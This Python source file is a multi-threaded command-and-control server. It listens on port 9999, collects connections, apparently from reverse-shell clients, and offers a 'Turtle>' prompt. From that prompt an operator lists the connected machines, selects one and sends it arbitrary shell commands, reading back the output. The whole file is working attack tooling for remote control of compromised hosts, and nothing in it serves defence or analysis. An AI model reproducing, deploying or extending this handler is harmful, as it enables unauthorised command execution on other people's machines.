import socket
import sys
from queue import Queue
import threading

# create socket
def socket_create():
    try:
        global host
        global port
        global s
        host=''
        port=9999
        s=socket.socket()
    except socket.error as err:
        print ("Socket Creation error: "+ str(err))

# bind socket to port and wait for connection form client
def socket_bind():
    try:
        global host
        global port
        global s
        print("binding socket to port: "+ str(port))
        s.bind((host,port))
        s.listen(5)
    except socket.error as err:
        print ("Socket Binding error: "+ str(err)+"\nRetrying....")
        socket_bind()

NUMBER_OF_THREADS=2
JOB_NUMBER=[1,2]
queue=Queue()
all_connections=[]
all_addresses=[]

# accept connections from multiple client and save it to the list
def accept_connections():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_addresses[:]
    while True: 
        try:
            conn,address=s.accept()
            conn.setblocking(True)
            all_connections.append(conn)
            all_addresses.append(address)
            print("\nConnection has been established: "+address[0])
        except:
            print("Error accepting connections")


#interactive prompt for sending command remotely
def start_turtle():
    while True:
        cmd=input("Turtle> ")
        if cmd=='list':
            list_connections()
        elif 'select' in cmd:
            conn=get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        else:
            print("command not recognised")


#display all the current connections
def list_connections():
    print("-----clients-----\n")
    for i,conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_addresses[i]
            continue
        print(str(i)+"    "+str(all_addresses[i][0])+"    "+str(all_addresses[i][1])+"\n")


# select a target client
def get_target(cmd):
    try:
        target=cmd.replace('select ','')
        target=int(target)
        conn=all_connections[target]
        print("you are now connected to "+str(all_addresses[target][0]))
        print(str(all_addresses[target][0])+ "> ",end="")
        return conn
    except:
        print("Not a valid selection")
        return None


#connect with remote target client
def send_target_commands(conn):
    while True:
        try:
            cmd=input()
            if len(str.encode(cmd))>0:
                if cmd=='quit':
                    break
                conn.send(str.encode(cmd))
                client_response=str(conn.recv(20480),"utf-8")
                print(client_response, end="")
        except:
            print("connection is closed")
            break

#create worker threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t=threading.Thread(target=work)
        t.daemon = True
        t.start()


#do the next job in the queue(one handles the connections, others send commands)
def work():
    while True:
        x=queue.get()
        if x==1:
            socket_create()
            socket_bind()
            accept_connections()
        if x==2:
            start_turtle()
        queue.task_done()



#each list item is the new job
def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()



create_workers()
create_jobs()